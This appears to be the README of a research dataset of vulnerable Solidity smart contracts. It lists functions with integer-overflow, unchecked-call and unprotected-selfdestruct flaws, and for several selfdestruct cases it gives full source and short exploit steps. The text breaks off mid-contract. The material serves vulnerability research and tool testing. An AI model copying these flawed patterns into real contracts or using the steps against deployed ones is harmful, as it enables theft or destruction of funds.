# PVD

121+67+10+31+18=247

## SWC-101: IOU (121 funcs, 119 files)

| No.  | file_name&vul_function_name                     |
| ---- | ----------------------------------------------- |
| 1    | 2018-10299&batchTransfer                        |
| 2    | 2018-10376&transferProxy                        |
| 3    | 2018-10468&transferFrom                         |
| 4    | 2018-10706&transferMulti                        |
| 5    | 2018-11239&_transfer                            |
| 6    | 2018-11335&mint                                 |
| 7    | 2018-11411&transferFrom                         |
| 8    | 2018-11429&mint                                 |
| 9    | 2018-11446&buy                                  |
| 10   | 2018-11561&distributeToken                      |
| 11   | 2018-11687&distributeBTR                        |
| 12   | 2018-12025-1&transferFrom                       |
| 13   | 2018-12025-2&transferFrom                       |
| 14   | 2018-12025-3&transferFrom                       |
| 15   | 2018-12062&sell                                 |
| 16   | 2018-12063&sell                                 |
| 17   | 2018-12067&sell                                 |
| 18   | 2018-12068&sell                                 |
| 19   | 2018-12070&sell                                 |
| 20   | 2018-12230&transferFrom                         |
| 21   | 2018-13041&mint                                 |
| 22   | 2018-13068&mintToken                            |
| 23   | 2018-13069&mintToken                            |
| 24   | 2018-13070&mintToken                            |
| 25   | 2018-13071&mintToken                            |
| 26   | 2018-13072&mintToken                            |
| 27   | 2018-13073&mintToken                            |
| 28   | 2018-13074&mintToken                            |
| 29   | 2018-13075&mintToken                            |
| 30   | 2018-13076&mintToken                            |
| 31   | 2018-13077&mintToken                            |
| 32   | 2018-13078&mintToken                            |
| 33   | 2018-13079&mintToken                            |
| 34   | 2018-13080&mintToken                            |
| 35   | 2018-13081&mintToken                            |
| 36   | 2018-13082&mintToken                            |
| 37   | 2018-13083&mintToken                            |
| 38   | 2018-13084&mintToken                            |
| 39   | 2018-13085&mintToken                            |
| 40   | 2018-13086&mintToken                            |
| 41   | 2018-13087&mintToken                            |
| 42   | 2018-13088&mintToken                            |
| 43   | 2018-13089&mintToken                            |
| 44   | 2018-13090&mintToken                            |
| 45   | 2018-13091&mintToken                            |
| 46   | 2018-13092&mintToken                            |
| 47   | 2018-13113&transfer                             |
| 48   | 2018-13113&transferFrom                         |
| 49   | 2018-13126&mint                                 |
| 50   | 2018-13127&mint                                 |
| 51   | 2018-13128&mint                                 |
| 52   | 2018-13129&mint                                 |
| 53   | 2018-13131&mint                                 |
| 54   | 2018-13132&mint                                 |
| 55   | 2018-13144&transfer                             |
| 56   | 2018-13189&mint                                 |
| 57   | 2018-13202&sell                                 |
| 58   | 2018-13208&sell                                 |
| 59   | 2018-13220&sell                                 |
| 60   | 2018-13221&sell                                 |
| 61   | 2018-13225&sell                                 |
| 62   | 2018-13227&sell                                 |
| 63   | 2018-13228&sell                                 |
| 64   | 2018-13230&sell                                 |
| 65   | 2018-13325&_sell                                |
| 66   | 2018-13326&transfer                             |
| 67   | 2018-13326&transferFrom                         |
| 68   | 2018-13327&transfer                             |
| 69   | 2018-13327&transferFrom                         |
| 70   | 2018-13493&mintToken                            |
| 71   | 2018-13533&mintToken                            |
| 72   | 2018-13625&mintlvlToken                         |
| 73   | 2018-13670&mintToken                            |
| 74   | 2018-13695&mint                                 |
| 75   | 2018-13698&mintTokens                           |
| 76   | 2018-13703&mintToken                            |
| 77   | 2018-13722&mint                                 |
| 78   | 2018-13777&mintToken                            |
| 79   | 2018-13778&mintToken                            |
| 80   | 2018-13779&mintToken                            |
| 81   | 2018-13782&mintToken                            |
| 82   | 2018-13783&mintToken                            |
| 83   | 2018-13836&multiTransfer                        |
| 84   | 2018-14001&batchTransfer                        |
| 85   | 2018-14002&distribute                           |
| 86   | 2018-14003&batchTransfer                        |
| 87   | 2018-14004&transfer_tokens_after_ICO            |
| 88   | 2018-14005&transferAny                          |
| 89   | 2018-14006&multipleTransfer                     |
| 90   | 2018-14063&increaseApproval                     |
| 91   | 2018-14084&sell                                 |
| 92   | 2018-14086&sell                                 |
| 93   | 2018-14087&fallback                             |
| 94   | 2018-14576&mintTokens                           |
| 95   | 2018-17050&mintToken                            |
| 96   | 2018-17882&batchTransfer                        |
| 97   | 2018-18665&mintToken                            |
| 98   | 2020-17752&fallback                             |
| 99   | 2021-33403&transfer                             |
| 100  | 2021-34270&mintToken                            |
| 101  | BECToken&batchTransfer                          |
| 102  | insecure_transfer&transfer                      |
| 103  | integer_overflow_1&add                          |
| 104  | integer_overflow_add&run                        |
| 105  | integer_overflow_benign_1&run                   |
| 106  | integer_overflow_mapping_sym_1&init             |
| 107  | integer_overflow_minimal&run                    |
| 108  | integer_overflow_mul&run                        |
| 109  | integer_overflow_multitx_multifunc_feasible&run |
| 110  | integer_overflow_multitx_onefunc_feasible&run   |
| 111  | overflow_simple_add&add                         |
| 112  | overflow_single_tx&overflowaddtostate           |
| 113  | overflow_single_tx&overflowlocalonly            |
| 114  | overflow_single_tx&overflowmulocalonly          |
| 115  | overflow_single_tx&overflowmultostate           |
| 116  | overflow_single_tx&underflowlocalonly           |
| 117  | overflow_single_tx&underflowtostate             |
| 118  | timelock&increaseLockTime                       |
| 119  | tokensalechallenge&buy                          |
| 120  | tokensalechallenge&sell                         |
| 121  | token&transfer                                  |



//TODO



## SWC104: UCR (67 funcs, 52 files)

| No.  | file_name&vul_function_name                                  |
| ---- | ------------------------------------------------------------ |
| 1    | mishandled&withdrawBalance                                   |
| 2    | lotto&sendToWinner                                           |
| 3    | lotto&withdrawLeftOver                                       |
| 4    | king_of_the_ether_throne&claimThrone                         |
| 5    | king_of_the_ether_throne&sweepCommission                     |
| 6    | etherpot_lotto&cash                                          |
| 7    | etherpot_lotto&fallback                                      |
| 8    | 0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e&Command           |
| 9    | 0xf29ebe930a539a60279ace72c707cba851a57707&go                |
| 10   | 0xf2570186500a46986f3139f65afedc2afe4f445d&makeOldFucks      |
| 11   | 0xec329ffc97d75fe03428ae155fc7793431487f63&execute           |
| 12   | 0xe894d54dca59cb53fe9cbc5155093605c7068220&transfer          |
| 13   | 0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87&Command           |
| 14   | 0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf&Command           |
| 15   | 0xe09b1ab8111c2729a76f16de96bc86a7af837928&wager             |
| 16   | 0xdb1c55f6926e7d847ddf8678905ad871a68199d2&Command           |
| 17   | 0xd5967fed03e85d1cce44cab284695b41bc675b5c&transfer          |
| 18   | 0xd2018bfaa266a9ec0a1a84b061640faa009def76&Command           |
| 19   | 0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c&proxy             |
| 20   | 0xbaa3de6504690efb064420d89e871c27065cdd52&proxy             |
| 21   | 0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7&withdraw          |
| 22   | 0xb620cee6b52f96f3c6b253e6eea556aa2d214a99&callFirstTarget   |
| 23   | 0xb620cee6b52f96f3c6b253e6eea556aa2d214a99&callSecondTarget  |
| 24   | 0xb620cee6b52f96f3c6b253e6eea556aa2d214a99&winPrize          |
| 25   | 0xb37f18af15bafb869a065b61fc83cfc44ed9cc27&sendMoney         |
| 26   | 0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77&proxy             |
| 27   | 0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6&fallback          |
| 28   | 0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6&fundPuppets       |
| 29   | 0xa46edd6a9a93feec36576ee5048146870ea2c3ae&transfer          |
| 30   | 0xa1fceeff3acc57d257b917e30c4df661401d6431&transfer          |
| 31   | 0x9d06cbafa865037a01d322d3f4222fa3e04e5488&tokens_buy        |
| 32   | 0x9d06cbafa865037a01d322d3f4222fa3e04e5488&withdraw          |
| 33   | 0x958a8f594101d2c0485a52319f29b2647f2ebc06&execute           |
| 34   | 0x8fd1e427396ddb511533cf9abdbebd0a7e08da35&WithdrawToken     |
| 35   | 0x8fd1e427396ddb511533cf9abdbebd0a7e08da35&WithdrawToHolder  |
| 36   | 0x89c1b3807d4c67df034fffb62f3509561218d30b&deliver           |
| 37   | 0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8&execute           |
| 38   | 0x806a6bd219f162442d992bdc4ee6eba1f2c5a707&Command           |
| 39   | 0x7d09edb07d23acb532a82be3da5c17d9d85806b4&donateToWhale     |
| 40   | 0x7d09edb07d23acb532a82be3da5c17d9d85806b4&loseWager         |
| 41   | 0x7a4349a749e59a5736efb7826ee3496a2dfd5489&Command           |
| 42   | 0x78c2a1e91b52bca4130b6ed9edd9fbcfd4671c37&Command           |
| 43   | 0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4&Command           |
| 44   | 0x663e4229142a27f00bafb5d087e1e730648314c3&withdrawBalance   |
| 45   | 0x663e4229142a27f00bafb5d087e1e730648314c3&giveBirth         |
| 46   | 0x663e4229142a27f00bafb5d087e1e730648314c3&withdrawBalance   |
| 47   | 0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839&WithdrawToken     |
| 48   | 0x610495793564aed0f9c7fc48dc4c7c9151d34fd6&sendMoney         |
| 49   | 0x5aa88d2901c68fda244f1d0584400368d2c8e739&Command           |
| 50   | 0x52d2e0f9b01101a59b38a3d05c80b7618aeed984&getTokens         |
| 51   | 0x524960d55174d912768678d8c606b4d50b79d7b1&transfer          |
| 52   | 0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152&transfer          |
| 53   | 0x4a66ad0bca2d700f11e1f2fc2c106f7d3264504c&transfer          |
| 54   | 0x4051334adc52057aca763453820cb0e045076ef3&transfer          |
| 55   | 0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2&Command           |
| 56   | 0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859&Command           |
| 57   | 0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01&WithdrawToken     |
| 58   | 0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01&WithdrawToHolder  |
| 59   | 0x39cfd754c85023648bf003bea2dd498c5612abfa&WithdrawToken     |
| 60   | 0x39cfd754c85023648bf003bea2dd498c5612abfa&WithdrawToHolder  |
| 61   | 0x2972d548497286d18e92b5fa1f8f9139e5653fd2&transfer          |
| 62   | 0x19cf8481ea15427a98ba3cdd6d9e14690011ab10&finalize          |
| 63   | 0x19cf8481ea15427a98ba3cdd6d9e14690011ab10&PartialFundsTransfer |
| 64   | 0x0cbe050f75bc8f8c2d6c0d249fea125fd6e1acc9&callAddress       |
| 65   | 0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e&donateToWhale     |
| 66   | 0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e&loseWager         |
| 67   | unchecked_return_value&callnotchecked                        |

//TODO

## SWC106: USI (10 funcs, 11 files)

| No.  | file_name&vul_function_name                                  | Fixed Method |
| ---- | ------------------------------------------------------------ | ------------ |
| 1    | WalletLibrary&kill                                           |              |
| 2    | suicide_multitx_feasible&run                                 | SWC          |
| 3    | simple_suicide&sudicideAnyone                                |              |
| 4    | 2020-19767&destroycontract                                   |              |
| 5    | 2020-19768&selfdestructs                                     |              |
| 6    | 2020-19769&BurnMe                                            |              |
| 7    | parity_wallet_bug_2&kill                                     |              |
| 8    | simple_suicide_confuse&Ox6c6be552d755b34fe8c36483e9a25e4afd353244 |              |
| 9    | simple_suicide.sol_confuse&Ox9fec079c615c1793bd54dd99e4406c18ce6dd615 | Manual       |
| 10   | suicide_multitx_feasible_confuse&Oxf6e446fc9c49afb6ce3d283f4df427dc0c6d4a1e | Manual       |

### 1. WalletLibrary&kill

#### Source Code

```javascript
//sol Wallet
// Multi-sig, daily-limited account proxy/wallet.
// @authors:
// Gav Wood <g@ethdev.com>
// inheritable "property" contract that enables methods to be protected by requiring the acquiescence of either a
// single, or, crucially, each of a number of, designated owners.
// usage:
// use modifiers onlyowner (just own owned) or onlymanyowners(hash), whereby the same hash must be provided by
// some number (specified in constructor) of the set of owners (specified in the constructor, modifiable) before the
// interior is executed.
/* @Labeled: [226, 227] */

pragma solidity ^0.4.9;

contract WalletEvents {
  // EVENTS

  // this contract only has six types of events: it can accept a confirmation, in which case
  // we record owner and operation (hash) alongside it.
  event Confirmation(address owner, bytes32 operation);
  event Revoke(address owner, bytes32 operation);

  // some others are in the case of an owner changing.
  event OwnerChanged(address oldOwner, address newOwner);
  event OwnerAdded(address newOwner);
  event OwnerRemoved(address oldOwner);

  // the last one is emitted if the required signatures change
  event RequirementChanged(uint newRequirement);

  // Funds has arrived into the wallet (record how much).
  event Deposit(address _from, uint value);
  // Single transaction going out of the wallet (record who signed for it, how much, and to whom it's going).
  event SingleTransact(address owner, uint value, address to, bytes data, address created);
  // Multi-sig transaction going out of the wallet (record who signed for it last, the operation hash, how much, and to whom it's going).
  event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);
  // Confirmation still needed for a transaction.
  event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);
}

contract WalletAbi {
  // Revokes a prior confirmation of the given operation
  function revoke(bytes32 _operation) external;

  // Replaces an owner `_from` with another `_to`.
  function changeOwner(address _from, address _to) external;

  function addOwner(address _owner) external;

  function removeOwner(address _owner) external;

  function changeRequirement(uint _newRequired) external;

  function isOwner(address _addr) constant returns (bool);

  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);

  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.
  function setDailyLimit(uint _newLimit) external;

  function execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);
  function confirm(bytes32 _h) returns (bool o_success);
}

contract WalletLibrary is WalletEvents {
  // TYPES

  // struct for the status of a pending operation.
  struct PendingState {
    uint yetNeeded;
    uint ownersDone;
    uint index;
  }

  // Transaction structure to remember details of transaction lest it need be saved for a later call.
  struct Transaction {
    address to;
    uint value;
    bytes data;
  }

  // MODIFIERS

  // simple single-sig function modifier.
  modifier onlyowner {
    if (isOwner(msg.sender))
      _;
  }
  // multi-sig function modifier: the operation must have an intrinsic hash in order
  // that later attempts can be realised as the same underlying operation and
  // thus count as confirmations.
  modifier onlymanyowners(bytes32 _operation) {
    if (confirmAndCheck(_operation))
      _;
  }

  // METHODS

  // gets called when no other function matches
  function() payable {
    // just being sent some cash?
    if (msg.value > 0)
      Deposit(msg.sender, msg.value);
  }

  // constructor is given number of sigs required to do protected "onlymanyowners" transactions
  // as well as the selection of addresses capable of confirming them.
  function initMultiowned(address[] _owners, uint _required) only_uninitialized {
    m_numOwners = _owners.length + 1;
    m_owners[1] = uint(msg.sender);
    m_ownerIndex[uint(msg.sender)] = 1;
    for (uint i = 0; i < _owners.length; ++i)
    {
      m_owners[2 + i] = uint(_owners[i]);
      m_ownerIndex[uint(_owners[i])] = 2 + i;
    }
    m_required = _required;
  }

  // Revokes a prior confirmation of the given operation
  function revoke(bytes32 _operation) external {
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    // make sure they're an owner
    if (ownerIndex == 0) return;
    uint ownerIndexBit = 2**ownerIndex;
    var pending = m_pending[_operation];
    if (pending.ownersDone & ownerIndexBit > 0) {
      pending.yetNeeded++;
      pending.ownersDone -= ownerIndexBit;
      Revoke(msg.sender, _operation);
    }
  }

  // Replaces an owner `_from` with another `_to`.
  function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {
    if (isOwner(_to)) return;
    uint ownerIndex = m_ownerIndex[uint(_from)];
    if (ownerIndex == 0) return;

    clearPending();
    m_owners[ownerIndex] = uint(_to);
    m_ownerIndex[uint(_from)] = 0;
    m_ownerIndex[uint(_to)] = ownerIndex;
    OwnerChanged(_from, _to);
  }

  function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    if (isOwner(_owner)) return;

    clearPending();
    if (m_numOwners >= c_maxOwners)
      reorganizeOwners();
    if (m_numOwners >= c_maxOwners)
      return;
    m_numOwners++;
    m_owners[m_numOwners] = uint(_owner);
    m_ownerIndex[uint(_owner)] = m_numOwners;
    OwnerAdded(_owner);
  }

  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    uint ownerIndex = m_ownerIndex[uint(_owner)];
    if (ownerIndex == 0) return;
    if (m_required > m_numOwners - 1) return;

    m_owners[ownerIndex] = 0;
    m_ownerIndex[uint(_owner)] = 0;
    clearPending();
    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot
    OwnerRemoved(_owner);
  }

  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {
    if (_newRequired > m_numOwners) return;
    m_required = _newRequired;
    clearPending();
    RequirementChanged(_newRequired);
  }

  // Gets an owner by 0-indexed position (using numOwners as the count)
  function getOwner(uint ownerIndex) external constant returns (address) {
    return address(m_owners[ownerIndex + 1]);
  }

  function isOwner(address _addr) constant returns (bool) {
    return m_ownerIndex[uint(_addr)] > 0;
  }

  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {
    var pending = m_pending[_operation];
    uint ownerIndex = m_ownerIndex[uint(_owner)];

    // make sure they're an owner
    if (ownerIndex == 0) return false;

    // determine the bit to set for this owner.
    uint ownerIndexBit = 2**ownerIndex;
    return !(pending.ownersDone & ownerIndexBit == 0);
  }

  // constructor - stores initial daily limit and records the present day's index.
  function initDaylimit(uint _limit) only_uninitialized {
    m_dailyLimit = _limit;
    m_lastDay = today();
  }
  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.
  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {
    m_dailyLimit = _newLimit;
  }
  // resets the amount already spent today. needs many of the owners to confirm.
  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {
    m_spentToday = 0;
  }

  // throw unless the contract is not yet initialized.
  modifier only_uninitialized { if (m_numOwners > 0) throw; _; }

  // constructor - just pass on the owner array to the multiowned and
  // the limit to daylimit
  function initWallet(address[] _owners, uint _required, uint _daylimit) only_uninitialized {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }

  // kills the contract sending everything to `_to`.
  function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
  }

  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.
  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide
  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value
  // and _data arguments). They still get the option of using them if they want, anyways.
  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {
    // first, take the opportunity to check that we're under the daily limit.
    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {
      // yes - just execute the call.
      address created;
      if (_to == 0) {
        created = create(_value, _data);
      } else {
        if (!_to.call.value(_value)(_data))
          throw;
      }
      SingleTransact(msg.sender, _value, _to, _data, created);
    } else {
      // determine our operation hash.
      o_hash = sha3(msg.data, block.number);
      // store if it's new
      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {
        m_txs[o_hash].to = _to;
        m_txs[o_hash].value = _value;
        m_txs[o_hash].data = _data;
      }
      if (!confirm(o_hash)) {
        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);
      }
    }
  }

  function create(uint _value, bytes _code) internal returns (address o_addr) {
    /*
    assembly {
      o_addr := create(_value, add(_code, 0x20), mload(_code))
      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))
    }
    */
  }

  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order
  // to determine the body of the transaction from the hash provided.
  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {
    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {
      address created;
      if (m_txs[_h].to == 0) {
        created = create(m_txs[_h].value, m_txs[_h].data);
      } else {
        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
          throw;
      }

      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);
      delete m_txs[_h];
      return true;
    }
  }

  // INTERNAL METHODS

  function confirmAndCheck(bytes32 _operation) internal returns (bool) {
    // determine what index the present sender is:
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    // make sure they're an owner
    if (ownerIndex == 0) return;

    var pending = m_pending[_operation];
    // if we're not yet working on this operation, switch over and reset the confirmation status.
    if (pending.yetNeeded == 0) {
      // reset count of confirmations needed.
      pending.yetNeeded = m_required;
      // reset which owners have confirmed (none) - set our bitmap to 0.
      pending.ownersDone = 0;
      pending.index = m_pendingIndex.length++;
      m_pendingIndex[pending.index] = _operation;
    }
    // determine the bit to set for this owner.
    uint ownerIndexBit = 2**ownerIndex;
    // make sure we (the message sender) haven't confirmed this operation previously.
    if (pending.ownersDone & ownerIndexBit == 0) {
      Confirmation(msg.sender, _operation);
      // ok - check if count is enough to go ahead.
      if (pending.yetNeeded <= 1) {
        // enough confirmations: reset and run interior.
        delete m_pendingIndex[m_pending[_operation].index];
        delete m_pending[_operation];
        return true;
      }
      else
      {
        // not enough: record that this owner in particular confirmed.
        pending.yetNeeded--;
        pending.ownersDone |= ownerIndexBit;
      }
    }
  }

  function reorganizeOwners() private {
    uint free = 1;
    while (free < m_numOwners)
    {
      while (free < m_numOwners && m_owners[free] != 0) free++;
      while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;
      if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)
      {
        m_owners[free] = m_owners[m_numOwners];
        m_ownerIndex[m_owners[free]] = free;
        m_owners[m_numOwners] = 0;
      }
    }
  }

  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and
  // returns true. otherwise just returns false.
  function underLimit(uint _value) internal onlyowner returns (bool) {
    // reset the spend limit if we're on a different day to last time.
    if (today() > m_lastDay) {
      m_spentToday = 0;
      m_lastDay = today();
    }
    // check to see if there's enough left - if so, subtract and return true.
    // overflow protection                    // dailyLimit check
    if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {
      m_spentToday += _value;
      return true;
    }
    return false;
  }

  // determines today's index.
  function today() private constant returns (uint) { return now / 1 days; }

  function clearPending() internal {
    uint length = m_pendingIndex.length;

    for (uint i = 0; i < length; ++i) {
      delete m_txs[m_pendingIndex[i]];

      if (m_pendingIndex[i] != 0)
        delete m_pending[m_pendingIndex[i]];
    }

    delete m_pendingIndex;
  }

  // FIELDS
  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;

  // the number of owners that must confirm the same operation before it is run.
  uint public m_required;
  // pointer used to find a free slot in m_owners
  uint public m_numOwners;

  uint public m_dailyLimit;
  uint public m_spentToday;
  uint public m_lastDay;

  // list of owners
  uint[256] m_owners;

  uint constant c_maxOwners = 250;
  // index on the list of owners to allow reverse lookup
  mapping(uint => uint) m_ownerIndex;
  // the ongoing operations.
  mapping(bytes32 => PendingState) m_pending;
  bytes32[] m_pendingIndex;

  // pending transactions we have at present.
  mapping (bytes32 => Transaction) m_txs;
}

```

#### Exploit*



### 2. suicide_multitx_feasible&run

#### Source Code

```javascript
/* @Labeled: [17] */
pragma solidity ^0.4.23;

contract SuicideMultiTxFeasible {
    uint256 private initialized = 0;
    uint256 public count = 1;

    function init() public {
        initialized = 1;
    }

    function run(uint256 input) {
        if (initialized == 0) {
            return;
        }

        selfdestruct(msg.sender);
    }
}

```

#### Exploit

1. deploy contract `SuicideMultiTxFeasible` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `init` by any address
3. call function `run`  by any address with arguments `0` 

### 3. simple_suicide&sudicideAnyone

#### Source Code

```javascript
/* @Labeled: [7] */
pragma solidity ^0.4.22;

contract SimpleSuicide {

  function sudicideAnyone() {
    selfdestruct(msg.sender);
  }

}

```

#### Exploit

1. deploy contract `SimpleSuicide` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `sudicideAnyone` by any address

### 4. 2020-19767&destroycontract

#### Source Code

```javascript
/**
 *Submitted for verification at Etherscan.io on 2018-11-20
*/

pragma solidity ^0.4.16;

interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
contract SafeM {
    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}


contract TokenERC20 is SafeM{
    // Public variables of the token
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;
    // This creates an array with all balances
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    // This generates a public event on the blockchain that will notify clients
    event Transfer(address indexed from, address indexed to, uint256 value);

    // This notifies clients about the amount burnt
    event Burn(address indexed from, uint256 value);

    /**
     * Constructor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    function TokenERC20() public {
        totalSupply = 90000000* 10 ** uint256(decimals);  // Updating total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Giving the creator all initial tokens
        name = "Lehman Brothers Coin";                                   // Setting the name for display purposes
        symbol = "LBC";   
            }
    
    function _transfer(address _from, address _to, uint _value) internal {
        // Prevent transfer to 0x0 address. Use burn() instead
        require(_to != 0x0);
        // Check if the sender has enough
        require(balanceOf[_from] >= _value);
        // Check for overflows
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        // Save this for an assertion in the future
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        // Subtract from the sender
        balanceOf[_from] -= _value;
        // Add the same to the recipient
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        // Asserts are used to use static analysis to find bugs in your code. They should never fail
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function Airdrop(address[] recipients, uint[] amount){
        
        for( uint i = 0 ; i < recipients.length ; i++ ) {
          transfer( recipients[i], amount[i] );
      }
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value*10**18);
    }
    
    
    function destroycontract(address _to) {

        selfdestruct(_to);

    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   // Check if the sender has enough
        balanceOf[msg.sender] -= _value;            // Subtract from the sender
        totalSupply -= _value;                      // Updates totalSupply
        emit Burn(msg.sender, _value*10**18);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                // Check if the targeted balance is enough
        require(_value <= allowance[_from][msg.sender]);    // Check allowance
        balanceOf[_from] -= _value;                         // Subtract from the targeted balance
        allowance[_from][msg.sender] -= _value;             // Subtract from the sender's allowance
        totalSupply -= _value;                              // Update totalSupply
        emit Burn(_from, _value*10**18);
        return true;
    }
    function () public payable {
        uint tokens;
        tokens = msg.value * 300000;       // 1 ETHER = 300000MGT
        balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], tokens);  
        totalSupply = safeAdd(totalSupply, tokens);
        emit Transfer(address(0), msg.sender, tokens); // transfer the token to the donator
        msg.sender.transfer(msg.value);           // send the ether to owner
    }

}
```

#### Exploit

1. deploy contract `TokenERC20` by EOA `0x5B38Da6a701c568545dCfcB03FcB875f56beddC4`  with 0 ether
2. call function `destroycontract`  by any address with 0 ether

### 5. 2020-19768&selfdestructs

#### Source Code

```javascript
/**
 *Submitted for verification at Etherscan.io on 2018-09-23
*/

pragma solidity ^0.4.16;

contract owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}

interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }

contract TokenERC20 {
    // Public variables of the token
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    // 18 decimals is the strongly suggested default, avoid changing it
    uint256 public totalSupply;

    // This creates an array with all balances
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    // This generates a public event on the blockchain that will notify clients
    event Transfer(address indexed from, address indexed to, uint256 value);

    // This notifies clients about the amount burnt
    event Burn(address indexed from, uint256 value);

    /**
     * Constrctor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens
        name = tokenName;                                   // Set the name for display purposes
        symbol = tokenSymbol;                               // Set the symbol for display purposes
    }

    /**
     * Internal transfer, only can be called by this contract
     */
    function _transfer(address _from, address _to, uint _value) internal {
        // Prevent transfer to 0x0 address. Use burn() instead
        require(_to != 0x0);
        // Check if the sender has enough
        require(balanceOf[_from] >= _value);
        // Check for overflows
        require(balanceOf[_to] + _value > balanceOf[_to]);
        // Save this for an assertion in the future
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        // Subtract from the sender
        balanceOf[_from] -= _value;
        // Add the same to the recipient
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
